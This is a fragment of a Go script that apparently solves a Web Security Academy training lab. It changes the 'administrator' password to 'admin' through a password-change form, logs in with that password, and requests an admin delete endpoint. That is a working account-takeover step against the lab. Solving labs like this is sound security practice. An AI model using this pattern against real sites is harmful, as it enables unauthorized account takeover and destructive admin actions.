...
func solve() error {
	baseUrl := "https://0a8000c504ad14f0c04f31ff003c00fb.web-security-academy.net"
	...
	values.Set("username", "administrator")
	values.Set("new-password-1", "admin")
	values.Set("new-password-2", "admin")

	_, body, err = postForm(client, changePassUrl, nil, values)
	if err != nil {
		return err
	}

	_, body, err = get(client, logoutUrl, nil)
	if err != nil {
		return err
	}
	...
	_, body, err = login(client, loginUrl, "administrator", "admin", csrfToken)
	if err != nil {
		return err
	}

	_, body, err = get(client, adminDeleteUrl, nil)
	if err != nil {
		return err
	}
